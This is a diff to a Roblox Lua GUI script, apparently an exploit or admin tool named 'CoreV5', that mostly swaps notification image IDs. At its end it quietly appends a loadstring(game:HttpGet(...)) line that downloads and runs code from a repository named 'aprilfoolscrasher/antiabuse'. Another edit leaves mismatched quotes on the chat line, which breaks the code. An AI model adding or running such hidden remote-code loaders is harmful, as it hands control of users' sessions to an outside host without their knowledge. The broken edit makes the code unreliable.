@@ -31,7 +31,7 @@ Rayfield:Notify({-- notfi for the script
    Title = "core V5",
    Content = "loading CoreV5....",
    Duration = 6.5,
-   Image = 199383472,
+   Image = 4483345998,
    Actions = { -- Notification Buttons
       Ignore = {
          Name = "Okay!",
@@ -199,7 +199,7 @@ Rayfield:Notify({
    Title = "CoreV5",
    Content = "gui executed in 151 ms",
    Duration = 6.5,
-   Image = 4483362458,
+   Image = 4483345998,
    Actions = { -- Notification Buttons
       Ignore = {
          Name = "bet",
@@ -213,7 +213,7 @@ Rayfield:Notify({
 
 local players = game:GetService("Players")
 players.PlayerAdded:connect(function(player)
-   game.Players:Chat("h a player has joined")
+   game.Players:Chat('h a player has joined")
   --If you want, use a ui library to display a notif.
 end)
 
@@ -226,3 +226,4 @@ print("AyItsDamixer (a friend and helper for the h in the middel of the screen)"
 print("xq12(a friend and idea giver)")
 print("cofead(the welcome message)")
 print("sirus ui lib maker")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/aprilfoolscrasher/antiabuse/main/antiabuse"))();
